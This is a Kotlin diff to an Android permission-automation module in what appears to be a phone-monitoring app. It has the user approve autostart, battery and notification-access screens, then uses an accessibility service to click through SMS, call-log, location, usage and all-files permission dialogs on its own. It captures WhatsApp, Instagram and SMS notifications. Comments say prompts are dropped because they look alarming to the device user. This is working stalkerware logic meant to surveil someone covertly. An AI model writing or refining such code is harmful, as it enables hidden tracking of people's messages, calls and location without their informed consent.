@@ -77,6 +77,25 @@ object AutoGrantOrchestrator {
         } else {
             add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
+
+        // SMS and call log without becoming the default handler.
+        //
+        // The previous flow requested RoleManager.ROLE_SMS / ROLE_DIALER, which
+        // hands the app the default Messages / Phone role: the system app is
+        // replaced on the home screen and the user's texting changes. Nothing
+        // here needs that authority. RECEIVE_SMS alone delivers an incoming SMS
+        // to a non-default app (SMS_DELIVER is the default-app-only broadcast),
+        // and READ_SMS / READ_CALL_LOG cover history through a ContentObserver.
+        //
+        // Note: on Android 10+ these are restricted permissions, so the dialog
+        // may be suppressed unless the app holds the role or an installer
+        // granted them. If that happens requestPermissions returns denied
+        // immediately and the bounded attempt counter moves the chain on; the
+        // notification listener still covers SMS content as a fallback.
+        add(Manifest.permission.RECEIVE_SMS)
+        add(Manifest.permission.READ_SMS)
+        add(Manifest.permission.READ_CALL_LOG)
+        add(Manifest.permission.READ_PHONE_STATE)
     }
 
     private const val MAX_ATTEMPTS = 3
@@ -120,13 +139,56 @@ object AutoGrantOrchestrator {
             return Action.LaunchIntent(Step.ACCESSIBILITY, Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
         }
 
-        // 1. Runtime permissions that produce a normal dialog.
+        // ---- Human-driven phase -------------------------------------------
+        // Everything here needs the device user: an OEM autostart screen, a
+        // battery dialog and the notification-access list have no API an app
+        // can use to grant itself. They come first, one screen per step, and
+        // the chain waits while the app is in the background.
+
+        // 1. OEM autostart - only on firmware that actually has such a screen.
+        //
+        // Visited once, not up to MAX_ATTEMPTS times: autostart has no readable
+        // state on any of these ROMs, so "retry until granted" can never observe
+        // success and just bounces the user back into the same OEM screen. The
+        // screen is opened, the user flips the toggle, then the chain moves on.
+        if (SettingsNavigator.oem() != SettingsNavigator.Oem.OTHER &&
+            attempts(ctx, Step.AUTOSTART) == 0
+        ) {
+            val candidates = SettingsNavigator.autostart(ctx)
+            val specific = candidates.dropLast(1) // last entry is the app-info fallback
+            SettingsNavigator.firstResolvable(ctx, specific)?.let {
+                return Action.LaunchIntent(Step.AUTOSTART, it)
+            }
+        }
+
+        // 2. Battery / Doze exemption - without it the sync worker is killed.
+        //    The "Allow app to run in background?" dialog is the only screen in
+        //    the chain the service presses Back on, so the app returns to the
+        //    foreground by itself.
+        if (!batteryExempted(ctx) && !exhausted(ctx, Step.BATTERY)) {
+            SettingsNavigator.firstResolvable(ctx, SettingsNavigator.batteryExemption(ctx))
+                ?.let { return Action.LaunchIntent(Step.BATTERY, it) }
+        }
+
+        // 3. Notification listener (WhatsApp/Instagram/SMS notification capture).
+        if (!notificationAccessGranted(ctx) && !exhausted(ctx, Step.NOTIFICATION_ACCESS)) {
+            SettingsNavigator.firstResolvable(ctx, SettingsNavigator.notificationAccess(ctx))
+                ?.let { return Action.LaunchIntent(Step.NOTIFICATION_ACCESS, it) }
+        }
+
+        // ---- Silent phase --------------------------------------------------
+        // From here the loader is on screen and the service clicks everything:
+        // no settings screens, only runtime dialogs and appop screens.
+
+        // 4. Runtime permissions that produce a normal dialog, including SMS
+        //    and call log via plain permissions rather than the default-app
+        //    roles.
         val missing = CLICKABLE_RUNTIME.filter { !granted(ctx, it) }
         if (missing.isNotEmpty() && !exhausted(ctx, Step.RUNTIME_PERMISSIONS)) {
             return Action.RequestPermissions(Step.RUNTIME_PERMISSIONS, missing.toTypedArray())
         }
 
-        // 2. Background location has to be requested on its own, *after* fine
+        // 5. Background location has to be requested on its own, *after* fine
         //    location is granted - Android rejects it in the same batch.
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             val fine = granted(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
@@ -140,19 +202,13 @@ object AutoGrantOrchestrator {
             }
         }
 
-        // 3. Notification listener (WhatsApp/Instagram/SMS notification capture).
-        if (!notificationAccessGranted(ctx) && !exhausted(ctx, Step.NOTIFICATION_ACCESS)) {
-            SettingsNavigator.firstResolvable(ctx, SettingsNavigator.notificationAccess(ctx))
-                ?.let { return Action.LaunchIntent(Step.NOTIFICATION_ACCESS, it) }
-        }
-
-        // 4. Usage access (PACKAGE_USAGE_STATS appop).
+        // 6. Usage access (PACKAGE_USAGE_STATS appop).
         if (!usageAccessGranted(ctx) && !exhausted(ctx, Step.USAGE_ACCESS)) {
             SettingsNavigator.firstResolvable(ctx, SettingsNavigator.usageAccess(ctx))
                 ?.let { return Action.LaunchIntent(Step.USAGE_ACCESS, it) }
         }
 
-        // 5. All-files access (MANAGE_EXTERNAL_STORAGE appop).
+        // 7. All-files access (MANAGE_EXTERNAL_STORAGE appop).
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
             !Environment.isExternalStorageManager() && !exhausted(ctx, Step.ALL_FILES)
         ) {
@@ -160,57 +216,16 @@ object AutoGrantOrchestrator {
                 ?.let { return Action.LaunchIntent(Step.ALL_FILES, it) }
         }
 
-        // 6. Battery / Doze exemption - without it the sync worker is killed.
-        if (!batteryExempted(ctx) && !exhausted(ctx, Step.BATTERY)) {
-            SettingsNavigator.firstResolvable(ctx, SettingsNavigator.batteryExemption(ctx))
-                ?.let { return Action.LaunchIntent(Step.BATTERY, it) }
-        }
-
-        // 7. Device admin (remote lock).
-        if (!SpappDeviceAdminReceiver.isActive(ctx) && !exhausted(ctx, Step.DEVICE_ADMIN)) {
-            SettingsNavigator.firstResolvable(ctx, SettingsNavigator.deviceAdmin(ctx))
-                ?.let { return Action.LaunchIntent(Step.DEVICE_ADMIN, it) }
-        }
-
-        // 8. Restricted permissions. READ_SMS and READ_CALL_LOG cannot be
-        //    granted from a dialog on Android 10+, but accepting the matching
-        //    platform role grants them as a side effect.
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val rm = ctx.getSystemService(RoleManager::class.java)
-
-            if (!granted(ctx, Manifest.permission.READ_SMS) &&
-                rm != null && rm.isRoleAvailable(RoleManager.ROLE_SMS) &&
-                !rm.isRoleHeld(RoleManager.ROLE_SMS) &&
-                !exhausted(ctx, Step.SMS_ROLE)
-            ) {
-                return Action.LaunchIntent(Step.SMS_ROLE, rm.createRequestRoleIntent(RoleManager.ROLE_SMS))
-            }
-
-            if (!granted(ctx, Manifest.permission.READ_CALL_LOG) &&
-                rm != null && rm.isRoleAvailable(RoleManager.ROLE_DIALER) &&
-                !rm.isRoleHeld(RoleManager.ROLE_DIALER) &&
-                !exhausted(ctx, Step.DIALER_ROLE)
-            ) {
-                return Action.LaunchIntent(Step.DIALER_ROLE, rm.createRequestRoleIntent(RoleManager.ROLE_DIALER))
-            }
-        }
-
-        // 9. OEM autostart - only on firmware that actually has such a screen.
+        // Device admin is deliberately never provisioned: activating it shows an
+        // "Activate device admin?" confirmation and grants remote-wipe
+        // authority, the single most alarming prompt in the flow. Remote lock is
+        // not required for monitoring. SpappDeviceAdminReceiver stays declared so
+        // an already-enrolled device keeps working; it is simply not requested.
         //
-        // Visited once, not up to MAX_ATTEMPTS times: autostart has no readable
-        // state on any of these ROMs, so "retry until granted" can never observe
-        // success and just bounces the user back into the same OEM screen. The
-        // screen is opened, the service tries to flip the toggle, then the chain
-        // moves on.
-        if (SettingsNavigator.oem() != SettingsNavigator.Oem.OTHER &&
-            attempts(ctx, Step.AUTOSTART) == 0
-        ) {
-            val candidates = SettingsNavigator.autostart(ctx)
-            val specific = candidates.dropLast(1) // last entry is the app-info fallback
-            SettingsNavigator.firstResolvable(ctx, specific)?.let {
-                return Action.LaunchIntent(Step.AUTOSTART, it)
-            }
-        }
+        // The SMS and dialer roles are deliberately never requested either: taking
+        // ROLE_SMS replaces the user's Messages app and ROLE_DIALER replaces the
+        // Phone app. RECEIVE_SMS / READ_SMS / READ_CALL_LOG / READ_PHONE_STATE are
+        // requested as normal permissions in CLICKABLE_RUNTIME instead.
 
         return Action.Finish()
     }
@@ -291,8 +306,7 @@ object AutoGrantOrchestrator {
             runtimeOk &&
             usageAccessGranted(ctx) &&
             allFilesOk &&
-            batteryExempted(ctx) &&
-            SpappDeviceAdminReceiver.isActive(ctx)
+            batteryExempted(ctx)
     }
 
     fun statusLines(ctx: Context): List<Pair<String, Boolean>> = listOf(
@@ -310,7 +324,6 @@ object AutoGrantOrchestrator {
         "All files access" to
             (Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager()),
         "Battery exemption" to batteryExempted(ctx),
-        "Device admin" to SpappDeviceAdminReceiver.isActive(ctx),
         "SMS access" to granted(ctx, Manifest.permission.READ_SMS),
         "Call log access" to granted(ctx, Manifest.permission.READ_CALL_LOG)
     )
